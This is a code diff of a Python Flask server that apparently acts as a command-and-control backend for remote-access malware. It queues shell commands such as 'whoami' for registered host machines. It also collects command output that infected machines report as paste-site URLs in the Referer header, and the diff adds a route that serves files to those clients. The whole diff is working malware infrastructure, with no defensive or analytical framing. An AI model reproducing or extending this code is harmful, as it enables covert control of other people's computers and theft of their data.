@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template, send_from_directory, jsonify
 from flask_cors import CORS
+from flask.helpers import safe_join
 
-import requests
 from colorama import init, Fore, Back, Style
 from hashlib import md5
-import datetime
+import os, requests, datetime
 
 # init time
 now = datetime.datetime.now()
@@ -19,6 +19,9 @@ init(autoreset=True)
 import db
 
 app = Flask(__name__)
+app.config['FILES_FOLDER'] = "files"
+static = safe_join(os.path.dirname(__file__), 'static')
+
 
 CORS(app, resources={r'/*': {'origins': '*'}})
 
@@ -39,17 +42,6 @@ def main():
 		);
 	"""
 
-	sql_create_cmdhistory = """
-		CREATE TABLE IF NOT EXISTS commands (
-			command_id INTEGER NOT NULL PRIMARY KEY,
-			command TEXT NOT NULL,
-			status INTEGER NULL,
-			answer TEXT NULL,
-			fk_host_id INTEGER NOT NULL,
-			FOREIGN KEY (fk_host_id) REFERENCES hosts(host_id)
-		);
-	"""
-
 	# create db conn
 	conn = create_connection(database)
 
@@ -62,17 +54,7 @@ def main():
 	'''
 
 	conn = db.create_connection(database)
-	with conn:
-		'''
-		hostname = ['super-pc']
-		host_id = insert_host(conn, hostname)
-		command = ('whoami', host_id)
-		command_id = insert_new_command(conn, command)
-		print(">success>")
-		'''
-		updatecmd = (1, "desktop-jc32", 1)
-		req_updatecmd = update_command_status(conn, updatecmd)
-		print("ok")
+
 
 # ===============================================
 
@@ -180,7 +162,7 @@ def phase1():
 # ===============================================
 @app.route("/dashboard")
 def dashboard():
-	return render_template('dashboard.html')
+	return render_template('index.html')
 # ===============================================
 
 
@@ -205,8 +187,8 @@ def api_commands_list():
 @app.route("/api/commands/add", methods=['POST'])
 def api_commands_add():
 	params = request.get_json()
-	success = db.api_add_command(params[0], params[1])
-	return success
+	success_status = db.api_add_command(params[0], params[1])
+	return success_status
 # ===============================================
 
 
@@ -221,21 +203,30 @@ def answer():
 	if referrer == None:
 		return None
 
-	info("\n\n== Machine: %s --> /answer ==\n== %s ==" % (hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
-
 	full_referrer = referrer.split(' -- ')
 
-	host = (full_referrer[0]).split(":")[1].split("-00")[0]
-	termbin_url = full_referrer[1]
+	host = (full_referrer[0]).split(":")[1].split("-00")[0] # host:<THIS>-00
+	resource_url = full_referrer[1].strip()
 
+	info("\n\n== Machine: %s --> /answer ==\n== %s ==" % (host, now.strftime("%Y-%m-%d %H:%M:%S")))
+	
 	# print("host : " + host)
-	# print("termbin_url : " + termbin_url)
+	# print("resource_url : " + resource_url)
 
-	success = db.api_add_answer(host, termbin_url)
+	success_status = db.api_add_answer(host, resource_url)
 
-	success("[+] Nouveau résultat de commande sauvegardé !\n--> URL : " + str(termbin_url))
+	success("[+] Nouveau résultat de commande sauvegardé !\n--> URL : " + str(resource_url))
 
 
-	return success
+	return success_status
 # ===============================================
+
+
+# serve files
+# ===============================================
+@app.route("/files/<name>")
+def serve_files(name):
+	return send_from_directory(
+		app.config['FILES_FOLDER'], name, as_attachment=True
+	)
 
